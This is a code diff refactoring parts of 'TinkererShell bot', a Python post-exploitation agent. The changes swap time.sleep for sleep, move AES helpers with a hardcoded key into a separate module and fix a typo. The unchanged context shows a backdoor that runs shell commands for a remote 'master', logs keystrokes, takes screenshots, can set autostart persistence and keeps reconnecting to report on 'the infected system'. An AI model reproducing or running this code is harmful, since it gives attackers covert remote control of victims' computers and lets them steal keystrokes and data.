@@ -1,9 +1,8 @@
-#!/usr/bin/python
+#!/usr/bin/python3.7
 # -*- coding: utf-8 -*-
 """TinkererShell bot, a simple agent for post exploitation.\n"""
 
 # Written By Ananke: https://github.com/4n4nk3
-import json
 import os
 import shutil
 import socket
@@ -11,19 +10,19 @@ import subprocess
 import sys
 import tempfile
 import threading
-import time
+from time import sleep
 from base64 import b64encode, b64decode
 from filecmp import cmp
 from pathlib import Path
 import pyscreenshot as ImageGrab
 from io import BytesIO
-# pycryptodome
-from Crypto.Cipher import AES
 from tendo import singleton
 
 # Importing module for autostart written by Jonas Wagner
 # http://29a.ch/2009/3/17/autostart-autorun-with-python
 import autorun
+
+from my_crypt_func import encode_aes, decode_aes
 
 # Activating persistence (True)
 persistenceactivation = False
@@ -128,12 +127,12 @@ def sender(data_to_send: str) -> None:
     length_crypt = encode_aes(length)
     # Sending the length and wait. Then send data
     s.send(bytes(length_crypt, 'utf-8'))
-    time.sleep(1)
+    sleep(1)
     s.send(bytes(encoded, 'utf-8'))
 
 
 def command_executor(command: str):
-    """Execute a command in the system shell ans send its output to the master.\n"""
+    """Execute a command in the system shell and send its output to the master.\n"""
     try:
         proc = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                                 stdin=subprocess.PIPE)
@@ -291,32 +290,6 @@ def uploader():
         sender('Operation aborted\n')
 
 
-def encode_aes(text_input: str) -> str:
-    """Encode a string and output an json in string form.\n"""
-    secret = b'4n4nk353hlli5w311d0n3andI1ik3it!'
-    cipher = AES.new(secret, AES.MODE_EAX)
-    ciphertext, tag = cipher.encrypt_and_digest(bytes(text_input, 'utf-8'))
-    lista = [ciphertext, tag, cipher.nonce]
-    json_k = ['ciphertext', 'tag', 'nonce']
-    json_v = [b64encode(x).decode('utf-8') for x in lista]
-    return json.dumps(dict(zip(json_k, json_v)))
-
-
-def decode_aes(json_input: str) -> str:
-    """Decode a string in json form and output a string.\n"""
-    try:
-        b64 = json.loads(json_input)
-        json_k = ['ciphertext', 'tag', 'nonce']
-        jv = {k: b64decode(b64[k]) for k in json_k}
-        secret = b'4n4nk353hlli5w311d0n3andI1ik3it!'
-        cipher = AES.new(secret, AES.MODE_EAX, nonce=jv['nonce'])
-        cleared = (cipher.decrypt_and_verify(jv['ciphertext'], jv['tag'])).decode('utf-8')
-        return cleared
-    except Exception as exception:
-        print(exception)
-        print("Incorrect decryption")
-
-
 # =================================================================================================
 
 # Defining correct keylogging procedure
@@ -415,13 +388,13 @@ def backdoor():
                 except Exception as exception:
                     print(exception)
                     print('>>> New attempt in 2 min')
-                    time.sleep(30)
+                    sleep(30)
                     print('>>> New attempt in 1,5 min')
-                    time.sleep(30)
+                    sleep(30)
                     print('>>> New attempt in 1 min')
-                    time.sleep(30)
+                    sleep(30)
                     print('>>> New attempt in 30 sec')
-                    time.sleep(30)
+                    sleep(30)
             if thr_exit.isSet():
                 break
             # Sending information relatives to the infected system
@@ -433,7 +406,7 @@ def backdoor():
             length_crypt = encode_aes(length)
             # Sending the length and wait. Then send data
             first_s.send(bytes(length_crypt, 'utf-8'))
-            time.sleep(1)
+            sleep(1)
             first_s.send(bytes(encoded, 'utf-8'))
             print('Connection successful')
             lengthcrypt = first_s.recv(1024).decode('utf-8')
@@ -443,7 +416,7 @@ def backdoor():
                 encrypted_received_data += first_s.recv(1024).decode('utf-8')
             new_port = int(decode_aes(encrypted_received_data))
             print('New port is gonna be {}'.format(new_port))
-            time.sleep(5)
+            sleep(5)
             first_s.close()
             # Connecting to the client on the new port
             s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -454,7 +427,7 @@ def backdoor():
             length_crypt = encode_aes(length)
             # Sending the length and wait. Then send data
             s.send(bytes(length_crypt, 'utf-8'))
-            time.sleep(1)
+            sleep(1)
             s.send(bytes(encoded, 'utf-8'))
             break
 
@@ -526,7 +499,7 @@ def backdoor():
         print('Connection closed')
         if thr_exit.isSet():
             break
-        time.sleep(120)
+        sleep(120)
     return True
 
 
